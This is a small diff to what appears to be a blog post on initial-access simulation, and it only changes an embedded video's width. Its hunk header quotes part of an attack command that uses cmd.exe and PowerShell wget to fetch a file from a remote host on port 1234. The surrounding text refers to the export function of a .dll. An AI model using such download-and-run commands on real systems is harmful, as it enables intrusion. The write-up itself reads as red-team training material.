@@ -112,7 +112,7 @@ C:\Windows\System32\cmd.exe /c powershell.exe wget http://192.168.133.152:1234/h
 ```
 The command is pretty similar even though in this case we need to specify the export function name declared in our `.dll`
 
-<video src="/assets/posts/2022-06-01-Initial-Access-Simulation/hvc1.mp4" controls="controls" style="max-width: 730px;">
+<video src="/assets/posts/2022-06-01-Initial-Access-Simulation/hvc1.mp4" controls="controls" style="max-width: 1000px;">
 </video>
 
 
